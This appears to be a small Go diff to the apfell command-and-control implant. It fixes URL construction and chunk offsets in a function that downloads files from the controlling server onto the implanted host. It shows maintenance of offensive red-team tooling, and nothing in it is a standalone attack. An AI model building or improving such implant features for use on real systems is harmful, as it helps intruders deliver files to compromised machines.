@@ -450,8 +450,7 @@ func (c *C2Default) GetFile(fileDetails structs.FileUploadParams) bool {
 	fileUploadMsg.FullPath = fileDetails.RemotePath
 
 	msg, _ := json.Marshal(fileUploadMsg)
-	rawData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url), msg)
-
+	rawData := c.htmlGetData(fmt.Sprintf("%s%s", c.BaseURL, url), msg)
 	fileUploadMsgResponse := structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
 	_ = json.Unmarshal(rawData, &fileUploadMsgResponse)
 
@@ -470,6 +469,7 @@ func (c *C2Default) GetFile(fileDetails structs.FileUploadParams) bool {
 	}
 
 	success = true
+	offset := int64(len(decoded))
 	if fileUploadMsgResponse.TotalChunks > 1 {
 		for index := 2; index <= fileUploadMsgResponse.TotalChunks; index++ {
 			fileUploadMsg = structs.FileUploadChunkMessage{}
@@ -480,19 +480,21 @@ func (c *C2Default) GetFile(fileDetails structs.FileUploadParams) bool {
 			fileUploadMsg.FullPath = fileDetails.RemotePath
 
 			msg, _ := json.Marshal(fileUploadMsg)
-			rawData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url), msg)
+			rawData := c.htmlGetData(fmt.Sprintf("%s%s", c.BaseURL, url), msg)
 			fileUploadMsgResponse = structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
 			_ = json.Unmarshal(rawData, &fileUploadMsgResponse)
 
 			decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
 
-			_, err := f.Write(decoded)
+			_, err := f.WriteAt(decoded, offset)
 
 			if err != nil {
 				log.Printf("Error writing to file: %s", err.Error())
 				success = false
 				break
 			}
+
+			offset = offset + int64(len(decoded))
 		}
 	}
 
